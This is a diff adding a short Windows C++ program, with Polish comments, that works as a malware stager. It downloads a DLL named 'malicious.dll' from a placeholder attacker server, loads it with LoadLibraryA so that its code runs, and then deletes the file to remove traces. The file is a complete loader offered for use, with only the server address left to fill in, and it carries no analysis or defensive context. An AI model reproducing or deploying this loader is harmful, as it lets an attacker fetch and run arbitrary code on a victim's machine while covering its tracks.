@@ -1,0 +1,52 @@
+#include <windows.h>
+#include <iostream>
+#include <urlmon.h> // Do pobierania plików z internetu
+#pragma comment(lib, "urlmon.lib") 
+
+using namespace std;
+
+int main()
+{
+    // Adres naszego serwera
+    LPCSTR dll_url = "http://YOURSERVERHERE/malicious.dll"; // Zmień na rzeczywisty URL do DLL
+    const char* local_dll_path = "downloaded.dll"; // Lokalna ścieżka, w której zapisujemy DLL
+    printf("[*] Downloading DLL from: %s...\n", dll_url);
+
+    // Pobieranie DLL z zewnętrznego serwera
+    HRESULT result = URLDownloadToFileA(NULL, dll_url, local_dll_path, 0, NULL);
+
+    if (FAILED(result))
+    {
+        printf("[-] Error: Could not download DLL from %s.\n", dll_url);
+        return EXIT_FAILURE;
+    }
+
+    printf("[*] DLL downloaded successfully");
+    // Ładowanie DLL
+
+    HINSTANCE hDll = LoadLibraryA(local_dll_path);
+    if (!hDll)
+    {
+        printf("[-] Error: Could not load DLL from %s.\n", local_dll_path);
+        return EXIT_FAILURE;
+    }
+
+    printf("[+] DLL loaded successfully.\n");
+
+    
+
+    // Zwolnienie załadowanej DLL
+    FreeLibrary(hDll);
+
+    // Usunięcie pliku DLL
+    if (DeleteFileA(local_dll_path))
+    {
+        printf("[+] DLL deleted successfully.\n");
+    }
+    else
+    {
+        printf("[-] Error: Could not delete DLL. Error code: %d", GetLastError());
+    }
+
+    return EXIT_SUCCESS;
+}
